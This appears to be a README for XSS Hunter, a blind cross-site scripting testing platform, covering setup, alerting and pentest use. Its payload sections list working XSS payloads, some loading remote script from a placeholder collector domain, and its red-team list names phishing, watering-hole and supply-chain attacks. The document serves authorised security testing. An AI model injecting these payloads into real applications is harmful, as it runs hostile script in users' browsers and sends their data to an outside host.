# XSS Hunter - Blind XSS Detection Platform

Collaborative platform for finding blind XSS vulnerabilities through payload distribution.

## Setup

### Self-Hosted Installation
```bash
# Clone repository
git clone https://github.com/mandatoryprogrammer/xsshunter-express.git
cd xsshunter-express

# Install dependencies
npm install

# Configure environment
cp .env.example .env
# Edit .env with your settings

# Start server
npm start
```

### Cloud Service
Use the hosted version at xsshunter.com for immediate testing.

## Payload Generation

### Basic JavaScript Payload
```javascript
"><script src="https://your-xss-hunter-domain.com"></script>
```

### Blind XSS Payloads
```javascript
// Standard payload
'><script src=https://yourdomain.xss.ht></script>

// Polyglot payload
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */onerror=alert('XSS') )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert('XSS')//>\x3e

// DOM-based payload
';alert('XSS');//
```

### Context-Specific Payloads
```javascript
// Attribute context
" onmouseover="alert('XSS')"

// JavaScript context
';alert('XSS');//

// CSS context  
</style><script>alert('XSS')</script>
```

## Detection Features

### Email Notifications
Automatic email alerts when payloads execute with:
- Target URL and referer
- User agent information
- IP address and geolocation
- Screenshot of executed payload
- DOM content at execution time

### Payload Correlation
- Unique payload identifiers
- Execution timeline tracking
- Multiple payload management
- Campaign organization

## Advanced Features

### Custom Payloads
Create specialized payloads for specific applications:
- File upload contexts
- JSON injection points
- Header injection scenarios
- Cookie-based XSS

### Reporting Integration
- Vulnerability report generation  
- Evidence collection and organization
- Client reporting capabilities
- Integration with security tools

## Use Cases

### Penetration Testing
- Black box application testing
- Internal application assessment
- Bug bounty hunting
- Security auditing

### Red Team Operations
- Phishing payload injection
- Watering hole attacks
- Supply chain compromise
- Social engineering campaigns

## Legal Considerations

Only deploy payloads on applications you own or have explicit written permission to test. Unauthorized XSS testing may violate computer fraud and abuse laws.

## Best Practices

- Use unique identifiers for tracking
- Document payload placement locations
- Monitor for false positives
- Coordinate with application owners
- Follow responsible disclosure guidelines
